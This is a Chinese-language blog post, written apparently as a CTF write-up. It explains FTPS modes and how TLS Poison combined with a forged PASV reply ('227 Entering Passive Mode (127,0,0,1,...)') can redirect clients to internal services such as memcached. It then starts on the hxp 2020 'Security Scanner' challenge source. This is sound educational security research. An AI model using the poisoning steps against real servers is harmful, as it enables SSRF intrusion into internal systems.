<!doctype html><html lang=en-us>
<head><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<link rel=manifest href=/manifest.json><meta name=description content="最近总结整理了 TLS Poison 攻击相关的知识，本文会继续讲 TLS Poison 利用，以及其在 CTF 的实际运用，也通过这个题目来聊聊 FTPS 相关知识。
"><title>TLS-Poison 攻击方式在 CTF 中的利用实践</title>
<link rel=canonical href=https://blog.zeddyu.info/2021/05/19/tls-ctf/>
<link rel=stylesheet href=/scss/style.min.css><meta property="og:title" content="TLS-Poison 攻击方式在 CTF 中的利用实践">
<meta property="og:description" content="最近总结整理了 TLS Poison 攻击相关的知识，本文会继续讲 TLS Poison 利用，以及其在 CTF 的实际运用，也通过这个题目来聊聊 FTPS 相关知识。
">
<meta property="og:url" content="https://blog.zeddyu.info/2021/05/19/tls-ctf/">
<meta property="og:site_name" content="Zeddy's Blog">
<meta property="og:type" content="article"><meta property="article:section" content="Posts"><meta property="article:tag" content="Sec"><meta property="article:tag" content="CTF"><meta property="article:published_time" content="2021-05-19T21:32:27+00:00"><meta property="article:modified_time" content="2021-05-19T21:32:27+00:00">
<meta name=twitter:site content="@ZeddYu_Lu">
<meta name=twitter:creator content="@ZeddYu_Lu"><meta name=twitter:title content="TLS-Poison 攻击方式在 CTF 中的利用实践">
<meta name=twitter:description content="最近总结整理了 TLS Poison 攻击相关的知识，本文会继续讲 TLS Poison 利用，以及其在 CTF 的实际运用，也通过这个题目来聊聊 FTPS 相关知识。
">
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-112937997-1','auto'),ga('send','pageview'))</script>
</head>
<body class="article-page has-toc">
<script>(function(){const a='StackColorScheme';localStorage.getItem(a)||localStorage.setItem(a,"auto")})()</script><script>(function(){const b='StackColorScheme',a=localStorage.getItem(b),c=window.matchMedia('(prefers-color-scheme: dark)').matches===!0;a=='dark'||a==='auto'&&c?document.documentElement.dataset.scheme='dark':document.documentElement.dataset.scheme='light'})()</script>
<div class="container main-container flex
extended">
<div id=article-toolbar>
<a href=https://blog.zeddyu.info class=back-home><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="15 6 9 12 15 18"/></svg>
<span>Back</span>
</a>
</div>
<main class="main full-width">
<article class=main-article>
<header class=article-header>
<div class=article-details>
<header class=article-category>
<a href=/categories/CTF/ style=background-color:#ce0000;color:#fff>
CTF
</a>
</header>
<h2 class=article-title>
<a href=/2021/05/19/tls-ctf/>TLS-Poison 攻击方式在 CTF 中的利用实践</a>
</h2>
<footer class=article-time>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>May 19, 2021</time>
</div>
<div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>
18 minute read
</time>
</div>
</footer>
</div>
</header>
<section class=article-content>
<p>最近总结整理了 TLS Poison 攻击相关的知识，本文会继续讲 TLS Poison 利用，以及其在 CTF 的实际运用，也通过这个题目来聊聊 FTPS 相关知识。</p>
<div class="notice notice-tip">
<div class=notice-title><svg xmlns="http://www.w3.org/2000/svg" class="icon notice-icon" viewBox="0 0 512 512"><path d="M504 256A248 248 0 118 256a248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z"/></svg></div><p>文章首发于长亭安全课堂：TLS-Poison 攻击方式在真实CTF赛题中的利用实践 <a href=https://mp.weixin.qq.com/s/ZziSf69AOyXoI0IgC0UyUQ>https://mp.weixin.qq.com/s/ZziSf69AOyXoI0IgC0UyUQ</a></p></div>
<p><strong>PS: 在阅读本文之前，建议您掌握相关的 TLS Poison 先验知识，本文不会再重新详细介绍 TLS Poison 攻击的基础知识</strong></p>
<p>我们首先再来回顾 Black Hat 这个议题，为什么作者使用的是 When TLS Hacks You 呢？而不是 When HTTPS Hack You ，说明这个问题是出现在 TLS 特性身上，所以目前我们貌似都更多只局限地专注在 HTTPS 上，这是比较狭隘的考虑。既然如此，HTTPS 是 HTTP over TLS ，那其他协议是不是也可以呢？比如 FTPS ，FTP over TLS 等等？那我们来看看 FTPS 可以如何使用。</p>
<h2 id=introduction-of-ftps>Introduction of FTPS</h2>
<blockquote>
<p>​ <strong>FTPS</strong> (also known <strong>FTP-SSL</strong>, and <em>FTP Secure</em>) is an extension to the commonly used <a class=link href=https://en.wikipedia.org/wiki/File_Transfer_Protocol target=_blank rel=noopener>File Transfer Protocol</a> (FTP) that adds support for the <a class=link href=https://en.wikipedia.org/wiki/Transport_Layer_Security target=_blank rel=noopener>Transport Layer Security</a> (TLS) and, formerly, the <a class=link href=https://en.wikipedia.org/wiki/Secure_Sockets_Layer target=_blank rel=noopener>Secure Sockets Layer</a> (SSL, which is now prohibited by <a class=link href=https://tools.ietf.org/html/rfc7568 target=_blank rel=noopener>RFC7568</a>) cryptographic protocols.</p>
<p>FTPS should not be confused with the <a class=link href=https://en.wikipedia.org/wiki/SSH_File_Transfer_Protocol target=_blank rel=noopener>SSH File Transfer Protocol</a> (SFTP), a secure file transfer subsystem for the <a class=link href=https://en.wikipedia.org/wiki/Secure_Shell target=_blank rel=noopener>Secure Shell</a> (SSH) protocol with which it is not compatible. It is also different from <a class=link href=https://en.wikipedia.org/wiki/FTP_over_SSH target=_blank rel=noopener>FTP over SSH</a>, which is the practice of tunneling FTP through an SSH connection.</p>
</blockquote>
<p>首先简单介绍一下 FTPS ，FTPS 是一种对常用的文件传输协议（FTP）添加传输层安全（TLS）和安全套接层（SSL）加密协议支持的扩展协议。</p>
<p>在 HTTPS 横空出世之后，SSL 协议也应用到了 FTP 上，随后在 1996 发布了 FTPS 的一个草案 <a class=link href=https://tools.ietf.org/id/draft-murray-auth-ftp-ssl-00.txt target=_blank rel=noopener>Secure FTP over SSL</a> ，但是直到 2005 年才最终确定终稿 <a class=link href=https://tools.ietf.org/html/rfc4217 target=_blank rel=noopener>RFC 4217 - Securing FTP with TLS</a> 。然而实际上，FTPS 拥有两种模式，这里并非指的是 FTP 的主动、被动模式，而是显式、隐式模式。</p>
<h3 id=implicit-mode>Implicit Mode</h3>
<p>在隐式模式下，FTPS 的默认端口在 990 端口上，隐式模式下所有的连接数据均为加密。</p>
<p>客户端必须先使用 TLS Client Hello 消息向 FTPS 服务器进行握手来创建加密连接，如果 FTPS 服务器未收到此类消息，则服务器应断开连接。 为了保持与现有的非 FTPS 感知客户端的兼容性，隐式 FTPS 默认在 IANA 规定的端口 990/TCP 上监听 FTPS 控制通道，并在端口 989/TCP 上监听 FTPS 数据通道。这使得管理员可以保留端口(控制通道 21/TCP 与数据通道 20/TCP )以兼容原始的FTP。</p>
<p>虽然我没有查找到隐式 FTPS 的相关历史，但是我个人觉得他更像在 SSL 时代应运而生的产物，更符合了 FTP over SSL 的意思，也就是一开始使用 TLS/SSL 进行会话创建，再进行数据加密传输。但 RFC 4217 中未定义隐式模式，因此它也被认为是FTP协商TLS/SSL中过时的早期方法。</p>
<p><figure>
<a href=https://www.sftpplus.de/static/images/4608-ImplicitFTPS.png><img src=https://www.sftpplus.de/static/images/4608-ImplicitFTPS.png loading=lazy>
</a>
</figure></p>
<h3 id=explicit-mode>Explicit Mode</h3>
<p>在显式模式（也称为FTPES）下，FTPS 客户端先与服务器创建明文连接，然后从控制通道明确请求服务端升级为加密连接（命令为: AUTH TLS）。控制通道与数据通道默认端口与原始 FTP 一样也是 21 端口。控制通道始终加密，而数据通道是否加密则为可选项。 同时若服务器未限制明文连接，也可以使用未加密的原始 FTP 进行连接，也就是说服务器在相同的端口上同时提供 FTP 与 FTPS 服务。</p>
<p>与FTP协商认证和安全的机制是在 RFC 2228 下增加的，其中包括新的 FTP 命令 AUTH 。虽然该 RFC 没有明确定义任何所需的安全机制，如 SSL 或 TLS ，但它确实要求 FTPS 客户端用一个双方都知道的机制挑战 FTPS 服务器。如果 FTPS 客户端用一个未知的安全机制挑战 FTPS 服务器， FTPS 服务器将以错误代码 504（不支持）响应 AUTH 命令。客户可以通过使用 FEAT 命令查询 FTPS 服务器来确定支持哪些机制，尽管服务器不一定需要诚实地披露它们支持哪些安全级别。调用 FTPS 安全的常见方法包括 AUTH TLS 和 AUTH SSL 。显式方法在 RFC 4217 中定义后，FTPS的合规性要求客户端始终使用 AUTH TLS 方法进行协商。</p>
<p><figure>
<a href=https://www.sftpplus.de/static/images/4608-ExplicitFTPS.png><img src=https://www.sftpplus.de/static/images/4608-ExplicitFTPS.png loading=lazy>
</a>
</figure></p>
<p>我们可以在 RFC 4217 中找到显式 FTPS 建立连接方式：</p>
<pre tabindex=0><code>              Client                                 Server
     control          data                   data               control
   ====================================================================

                                                                socket()
                                                                bind()
     socket()
     connect()  ----------------------------------------------&gt; accept()
               &lt;----------------------------------------------  220
     AUTH TLS   ----------------------------------------------&gt;
               &lt;----------------------------------------------  234
     TLSneg()  &lt;----------------------------------------------&gt; TLSneg()
     PBSZ 0     ----------------------------------------------&gt;
               &lt;----------------------------------------------  200
     PROT P     ----------------------------------------------&gt;
               &lt;----------------------------------------------  200
     USER fred  ----------------------------------------------&gt;
               &lt;----------------------------------------------  331
     PASS pass  ----------------------------------------------&gt;
               &lt;----------------------------------------------  230

   Note 1: The order of the PBSZ/PROT pair and the USER/PASS pair (with
   respect to each other) is not important (i.e., the USER/PASS can
   happen prior to the PBSZ/PROT, or the server can refuse to allow a
   PBSZ/PROT pair until the USER/PASS pair has happened).

   Note 2: The PASS command might not be required at all (if the USER
   parameter and any client identity presented provide sufficient
   authentication).  The server would indicate this by issuing a '232'
   reply to the USER command instead of the '331', which requests a PASS
   from the client (see below).

   Note 3: The AUTH command might not be the first command after the
   receipt of the 220 welcome message.
</code></pre><p>数据传输阶段：</p>
<pre tabindex=0><code>12.6.  A Standard Data Transfer with Protection

              Client                                 Server
     control          data                   data               control
   ====================================================================

                      socket()
                      bind()
     PORT w,x,y,z,a,b --------------------------------------------&gt;
         &lt;-------------------------------------------------------- 200
     STOR file ---------------------------------------------------&gt;
                                             socket()
                                             bind()
         &lt;-------------------------------------------------------- 150
                      accept()  &lt;----------  connect()
                      TLSneg()  &lt;----------&gt; TLSneg()
                      TLSwrite() ----------&gt; TLSread()
                      TLSshutdown() -------&gt; TLSshutdown()
                      close()    ----------&gt; close()
         &lt;-------------------------------------------------------- 226

12.7.  A Firewall-Friendly Data Transfer with Protection

              Client                                 Server
     control          data                   data               control
   ====================================================================

     PASV --------------------------------------------------------&gt;
                                             socket()
                                             bind()
         &lt;------------------------------------------ 227 (w,x,y,z,a,b)
                      socket()
     STOR file ---------------------------------------------------&gt;
                      connect()  ----------&gt; accept()
         &lt;-------------------------------------------------------- 150
                      TLSneg()   &lt;---------&gt; TLSneg()
                      TLSwrite()  ---------&gt; TLSread()
                      TLSshutdown() -------&gt; TLSshutdown()
                      close()     ---------&gt; close()
         &lt;-------------------------------------------------------- 226
</code></pre><h2 id=tls-poison-in-ftps>TLS Poison In FTPS</h2>
<p>看到如上解释，想必大家可能也会有思考，那么是不是 FTPS 也会有 TLS 会话重用的特性呢？那么是不是也可以跟 TLS Poison 相关联起来呢？</p>
<h3 id=explicit>Explicit</h3>
<p>首先我们来先看看拥有 RFC 4217 规范的显示 FTPS ，我们可以借用 pyftpdlib 来做一个简单的 FTPS Server</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=s2>&#34;&#34;&#34;
</span><span class=s2>An RFC-4217 asynchronous FTPS server supporting both SSL and TLS.
</span><span class=s2>Requires PyOpenSSL module (http://pypi.python.org/pypi/pyOpenSSL).
</span><span class=s2>&#34;&#34;&#34;</span>

<span class=kn>from</span> <span class=nn>pyftpdlib.servers</span> <span class=kn>import</span> <span class=n>FTPServer</span>
<span class=kn>from</span> <span class=nn>pyftpdlib.authorizers</span> <span class=kn>import</span> <span class=n>DummyAuthorizer</span>
<span class=kn>from</span> <span class=nn>pyftpdlib.handlers</span> <span class=kn>import</span> <span class=n>TLS_FTPHandler</span>


<span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
    <span class=n>authorizer</span> <span class=o>=</span> <span class=n>DummyAuthorizer</span><span class=p>()</span>
    <span class=c1># authorizer.add_user(&#39;ftpuser&#39;, &#39;ftpuser123&#39;, &#39;.&#39;, perm=&#39;elradfmwMT&#39;)</span>
    <span class=n>authorizer</span><span class=o>.</span><span class=n>add_anonymous</span><span class=p>(</span><span class=s1>&#39;.&#39;</span><span class=p>)</span>
    <span class=n>handler</span> <span class=o>=</span> <span class=n>TLS_FTPHandler</span>
    <span class=n>handler</span><span class=o>.</span><span class=n>certfile</span> <span class=o>=</span> <span class=s1>&#39;keycert.pem&#39;</span>
    <span class=n>handler</span><span class=o>.</span><span class=n>authorizer</span> <span class=o>=</span> <span class=n>authorizer</span>
    <span class=c1># requires SSL for both control and data channel</span>
    <span class=n>handler</span><span class=o>.</span><span class=n>tls_control_required</span> <span class=o>=</span> <span class=kc>True</span>
    <span class=n>handler</span><span class=o>.</span><span class=n>tls_data_required</span> <span class=o>=</span> <span class=kc>True</span>
    <span class=n>server</span> <span class=o>=</span> <span class=n>FTPServer</span><span class=p>((</span><span class=s1>&#39;&#39;</span><span class=p>,</span> <span class=mi>11211</span><span class=p>),</span> <span class=n>handler</span><span class=p>)</span>
    <span class=n>server</span><span class=o>.</span><span class=n>serve_forever</span><span class=p>()</span>

<span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
    <span class=n>main</span><span class=p>()</span>
</code></pre></div><p>对于客户端我们可以使用 curl 来发起一个显式 FTPS 请求：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>curl --ftp-ssl --user name:passwd ftp://ftp.host.com/
</code></pre></div><p>如果需要用户验证就加上<code>--user</code>选项即可，不需要的话就不用，结果如图所示：</p>
<p><figure>
<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510000343.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510000343.png loading=lazy>
</a>
</figure></p>
<p>我们可以清楚的看到在显式 FTPS 在使用<code>AUTH SSL</code>命令之后才与服务器建立的 TLS 连接，并在<code>LIST</code>之后我们可以看到重新使用了 TLS Session 。</p>
<p>这里我们简单回顾一下，在利用 HTTPS 进行 TLS Poison 时，我们需要再次使用 HTTP 重定向让客户端重新与我们建立会话，但是仔细观察 FTPS ，我们并没有使用类似 HTTPS 重定向的功能让其再次与 FTPS 服务器建立连接，那为什么我们只是简单访问一次 FTPS 服务器就会产生会话重用的现象呢？</p>
<p>让我们看之前发生了什么，客户端使用了<code>EPSV</code>命令表示使用 FTP 被动模式，FTP 服务器以<code>(||||32949)</code>对该命令进行了回复。</p>
<p>这里我们简单回顾一下 FTP 的被动模式：在被动模式的 FTP 中，客户端启动到服务器的两个连接，<strong>解决了防火墙阻止从服务器到客户端的传入数据端口连接的问题</strong>。FTP 连接建立后，客户端在本地打开两个随机的非系统端口 N 和 N + 1(N > 1023)。第一个端口连接服务器上的 21 端口，但是客户端这次将会发出 PASV 命令，也就是不允许服务器连接回其数据端口。这样，服务器随后会打开一个随机的非系统端口 P (P > 1023)，并将 P 发送给客户端作为 PASV 命令的响应。然后客户端启动从端口 N+1 到端口 P 的连接来传输数据。其中<code>EPSV</code>命令为<code>PASV</code>的更新版本，主要为了兼容 IPv6 而在 RFC 2428 中定义的。</p>
<p><figure>
<a href=https://miro.medium.com/max/1926/1*yyyR4y2MDi3O7_NeUmiGjw.png><img src=https://miro.medium.com/max/1926/1*yyyR4y2MDi3O7_NeUmiGjw.png loading=lazy>
</a>
</figure></p>
<p>所以在被动模式中，我们可以借由上图清楚的明白，在数据传输阶段，客户端需要与服务端重新建立一次连接！而在显式 FTPS 当中，重新建立连接就可以重新使用 TLS 会话，也就意味着可能被 TLS Poison 攻击！</p>
<h3 id=implicit>Implicit</h3>
<p>对于隐式模式，因为一开始就需要建立 TLS 会话，所以即使没有 RFC 规定，理论上也很明显应该也同样会支持 TLS 会话重用的机制。</p>
<p>这里我们可以使用 vsftpd 来进行简单实验，安装 vsftpd 后在 /etc/vsftp.conf 中开启<code>implicit_ssl=YES</code>选项</p>
<p>参考配置：</p>
<pre tabindex=0><code>listen=NO
listen_ipv6=YES
anonymous_enable=YES
local_enable=YES
write_enable=YES
local_umask=022

anon_root=/var/ftp/
no_anon_password=YES
hide_ids=YES

dirmessage_enable=YES
use_localtime=YES
xferlog_enable=YES
connect_from_port_20=YES
secure_chroot_dir=/var/run/vsftpd/empty
pam_service_name=vsftpd
pasv_enable=Yes
pasv_min_port=10000
pasv_max_port=11000

rsa_cert_file=/home/ubuntu/tls/fullchain.pem
rsa_private_key_file=/home/ubuntu/tls/privkey.pem

ssl_enable=YES
ssl_ciphers=HIGH

allow_anon_ssl=YES
force_local_data_ssl=YES
force_local_logins_ssl=YES

ssl_tlsv1=YES
ssl_sslv2=NO
ssl_sslv3=NO

listen_port=11211
implicit_ssl=YES
</code></pre><p>请按照其他教程申请对应域名证书、配置好匿名 ssl 访问 vsftpd ，否则很容易导致 vsftpd 报错，并且检查好 vsftpd 状态是否成功运行。</p>
<p>配置好 vsftpd 后使用 curl 进行访问:</p>
<pre tabindex=0><code>curl ftps://exmaple.com -v
</code></pre><p>这里我另外增加了<code>--tls-max 1.2</code>选项，因为在 TLS 1.3 当中， Session ID 传输在加密过程中，不便观察，而 TLS 1.2 可以在 Server Hello 消息中看到 TLS Server 设置的 Session ID，所以这里我们使用<code>--tls-max 1.2</code>迫使 curl 最大使用 TLS 1.2 版本。</p>
<p>我们就可以观察到如下图所示现象：</p>
<p><figure>
<a href=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510123202.png><img src=https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20210510123202.png loading=lazy>
</a>
</figure></p>
<p>可以看到也是在使用<code>PASV</code>命令之后，也就是数据传输阶段时，重新使用了 Session ID 进行建立 TLS 会话。</p>
<h3 id=pasv>PASV</h3>
<p>既然确定了可以重用 TLS 会话，那么接下来的一个问题就是 DNS Rebinding 的问题，也是 TLS Poison 攻击中的关键问题。</p>
<p>但是众所周知，特别是在过去的一年当中，FTP 在 CTF 中的利用出现得也算比较多的了，利用主动、被动模式进行 SSRF 也不并不是新鲜的 Trick 了，所以在这里我们还可以 FTPS 服务端向客户端默认发送的<code>PASV</code>命令给予恶意回复为<code>227 Entering Passive Mode (127,0,0,1,43,203)</code>，就可以得到一个简单的 “DNS Rebinding” 效果了。</p>
<p>但是众所周知，这种小 Trick 应该被视为一种漏洞，因为在设计之初，本来就应该将 FTP 客户端、服务端进行绑定，也就是说，无论 FTP 使用被动还是主动模式，都应该是服务端与客户端之间进行建立控制流与数据流，并不应该与第三者进行，况且如果攻击者恶意将数据流定向到内网端口就极易产生 SSRF 。</p>
<p>所以，Firefox 早在 2007 年就修复了 FTP 带来的这个问题，并分配了 CVE 编号：CVE-2007-1562 ，而 curl 迟迟在 2020 年才被发现这类问题并修复，也分配了 CVE 编号：CVE-2020-8284。curl 版本在 4.0 与 7.73.0 之间都会受到该种漏洞的影响，详见：<a class=link href=https://curl.se/docs/CVE-2020-8284.html target=_blank rel=noopener>trusting FTP PASV responses</a></p>
<p>所以对于 FTPS 来说，只要存在<code>PASV</code>这个漏洞，就可以非常方便地使用 TLS Poison 进行攻击。具体步骤为：</p>
<ol>
<li>curl 访问 ftps 服务器，并与其建立 tls 握手</li>
<li>ftps 服务器在建立 tls 连接时设置恶意 session id</li>
<li>ftps 对于 curl 发出的<code>pasv</code>命令返回<code>(127,0,0,1,43,203)</code>，并等待接下来的<code>LIST</code>等命令</li>
<li>之后 curl 才会与 127.0.0.1:11211 尝试重用 session id 建立 TLS 会话</li>
</ol>
<p>好了，熟悉了 TLS Poison 攻击以及确定 FTPS 两个形式都可能受到 TLS Poison 攻击，那接下来我们就来亲自体验一下在 CTF 当中的应用吧。</p>
<h2 id=hxp-ctf---security-scanner>HXP CTF - Security Scanner</h2>
<p>这是来自 2020 年 hxp CTF 当中的一道 web 方向题目，到 hxp 比赛结束只有两解，算是一道比较难的题目。这个题目其实我很早就做复盘的一个题，利用了今年 DEF CON 等 web 的时间把这个题做了一次简单的复盘。</p>
<h3 id=description>Description</h3>
<blockquote>
<p>​ Finally, after all these years computers are stealing my job.</p>
<p>Try our new robotic security scanner.</p>
</blockquote>
<p>Author: <a class=link href=https://bierbaumer.net/ target=_blank rel=noopener>0xbb</a></p>
<p>主要题目源码：</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>

<span class=nx>session_start</span><span class=p>();</span>
<span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;sandbox&#39;</span><span class=p>]))</span> <span class=p>{</span>
    <span class=nv>$id</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
    <span class=k>while</span><span class=p>(</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$id</span><span class=p>)</span> <span class=o>&lt;</span> <span class=mi>10</span><span class=p>)</span> <span class=p>{</span>
        <span class=nv>$b</span> <span class=o>=</span> <span class=nx>random_bytes</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
        <span class=k>if</span><span class=p>(</span><span class=nx>ord</span><span class=p>(</span><span class=nv>$b</span><span class=p>)</span> <span class=o>&gt;</span> <span class=mi>32</span> <span class=o>&amp;&amp;</span> <span class=nx>ord</span><span class=p>(</span><span class=nv>$b</span><span class=p>)</span> <span class=o>!=</span> <span class=mh>0x7f</span><span class=p>)</span> <span class=p>{</span>
            <span class=nv>$id</span> <span class=o>.=</span> <span class=nv>$b</span><span class=p>;</span>
        <span class=p>}</span>
    <span class=p>}</span>
    <span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;sandbox&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$id</span><span class=p>;</span>
<span class=p>}</span>

<span class=k>echo</span> <span class=s1>&#39;&lt;h1&gt;Sandbox&lt;/h1&gt;&#39;</span><span class=p>;</span>
<span class=k>echo</span> <span class=s1>&#39;&lt;code&gt;&#39;</span><span class=o>.</span><span class=nx>base64_encode</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;sandbox&#39;</span><span class=p>])</span><span class=o>.</span><span class=s1>&#39;&lt;/code&gt;&#39;</span><span class=p>;</span>  

<span class=nv>$m</span> <span class=o>=</span> <span class=k>new</span> <span class=nx>Memcached</span><span class=p>();</span>
<span class=nv>$m</span><span class=o>-&gt;</span><span class=na>addServer</span><span class=p>(</span><span class=s1>&#39;127.0.0.1&#39;</span><span class=p>,</span> <span class=mi>11211</span><span class=p>);</span>

<span class=nv>$url</span> <span class=o>=</span> <span class=nx>strval</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;url&#39;</span><span class=p>]);</span>
<span class=k>if</span> <span class=p>(</span><span class=nv>$m</span><span class=o>-&gt;</span><span class=na>get</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;sandbox&#39;</span><span class=p>]</span><span class=o>.</span><span class=nv>$url</span><span class=p>)</span> <span class=o>!==</span> <span class=s1>&#39;OK&#39;</span><span class=p>)</span> <span class=p>{</span>
    <span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/^[0-9a-zA-Z:\.\/-]{1,64}$/&#39;</span><span class=p>,</span> <span class=nv>$url</span><span class=p>)</span> <span class=o>!==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
        <span class=k>die</span><span class=p>(</span><span class=s1>&#39;security :(&#39;</span><span class=p>);</span>
    <span class=p>}</span>

    <span class=nv>$git_check</span> <span class=o>=</span> <span class=s2>&#34;001e# service=git-upload-pack</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
    <span class=nv>$data</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nv>$url</span> <span class=o>.</span><span class=s1>&#39;/info/refs?service=git-upload-pack&#39;</span><span class=p>);</span>
    <span class=k>if</span> <span class=p>(</span><span class=nv>$data</span>  <span class=o>===</span> <span class=k>FALSE</span> <span class=o>||</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$data</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$git_check</span><span class=p>))</span> <span class=o>!==</span> <span class=nv>$git_check</span><span class=p>)</span> <span class=p>{</span>
        <span class=k>die</span><span class=p>(</span><span class=s2>&#34;doesn&#39;t look like git :(&#34;</span><span class=p>);</span>
    <span class=p>}</span>

    <span class=nv>$m</span><span class=o>-&gt;</span><span class=na>set</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;sandbox&#39;</span><span class=p>]</span><span class=o>.</span><span class=nv>$url</span><span class=p>,</span> <span class=s1>&#39;OK&#39;</span><span class=p>,</span> <span class=nx>time</span><span class=p>()</span> <span class=o>+</span> <span class=mi>300</span><span class=p>);</span>
<span class=p>}</span>

<span class=nv>$output</span> <span class=o>=</span> <span class=p>[];</span>
<span class=nv>$return_var</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
<span class=nx>exec</span><span class=p>(</span><span class=s2>&#34;timeout -s KILL 3 git ls-remote --tags -- </span><span class=si>$url</span><span class=s2>&#34;</span><span class=p>,</span> <span class=nv>$output</span><span class=p>,</span> <span class=nv>$return_var</span><span class=p>);</span>
<span class=k>if</span><span class=p>(</span><span class=nv>$return_var</span> <span class=o>!==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
    <span class=k>die</span><span class=p>(</span><span class=s1>&#39;analysis failed :(&#39;</span><span class=p>);</span>
<span class=p>}</span>

<span class=k>echo</span> <span class=s1>&#39;&lt;h1&gt;Analysis&lt;/h1&gt;&#39;</span><span class=p>;</span>
<span class=k>echo</span> <span class=s2>&#34;URL: </span><span class=si>${</span><span class=nv>url</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>;</span>
<span class=k>echo</span> <span class=s1>&#39;&lt;h2&gt;Tags&lt;/h2&gt;&#39;</span><span class=p>;</span>
<span class=k>echo</span> <span class=s1>&#39;&lt;ul&gt;&#39;</span><span class=p>;</span>

<span class=k>foreach</span><span class=p>(</span><span class=nv>$output</span> <span class=k>as</span> <span class=nv>$l</span><span class=p>)</span> <span class=p>{</span>
    <span class=k>echo</span> <span class=s2>&#34;&lt;li&gt;&lt;code&gt;</span><span class=si>${</span><span class=nv>l</span><span class=si>}</span><span class=s2>&lt;/code&gt;&lt;/li&gt;&#34;</span><span class=p>;</span>
<span class=p>}</span>
<span class=k>echo</span> <span class=s1>&#39;&lt;/ul&gt;&#39;</span><span class=p>;</span>

<span class=k>echo</span> <span class=s1>&#39;&lt;h2&gt;Result&lt;/h2&gt;&#39;</span><span class=p>;</span>

<span class=k>if</span><span class=p>(</span><span class=k>TRUE</span><span class=p>)</span> <span class=p>{</span> <span class=c1>// patented algorithm (tm)
</span><span class=c1></span>    <span class=k>echo</span> <span class=s1>&#39;Likely insecure :(&#39;</span><span class=p>;</span> 
<span class=p>}</span>
</code></pre></div><h3 id=analyze>Analyze</h3>
<p>审计代码，我们可以总结出代码执行的主要流程如下：</p>
<ul>
<li>生成随机字符串做 SANDBOX</li>
<li>用户输入 url 后，从 Memecached 中获取键值为 SANDBOX + url 的 Value 值，判断是否为 &ldquo;OK&rdquo;
<ul>
<li>如果不是，通过<code>^[0-9a-zA-Z:\.\/-]{1,64}$</code>正则后，通过<code>file_get_contents</code>访问<code>$url .'/info/refs?service=git-upload-pack'</code>，检查结果是否以<code>001e# service=git-upload-pack\n</code>开头
<ul>
<li>如果不是以<code>001e# service=git-upload-pack\n</code>开头，则结束程序</li>
<li>如果是，则会在 Memecached 中将键值为 SANDBOX + url 的 Value 值设置为 &ldquo;OK&rdquo;，时间为 5min</li>
</ul>
</li>
<li>如果是 &ldquo;OK&rdquo; ，则会使用<code>exec</code>执行命令<code>timeout -s KILL 3 git ls-remote --tags -- $url</code>，如果访问成功则输出响应</li>
</ul>
</li>
</ul>
<p>整个代码流程如下图所示：</p>
<p><figure>
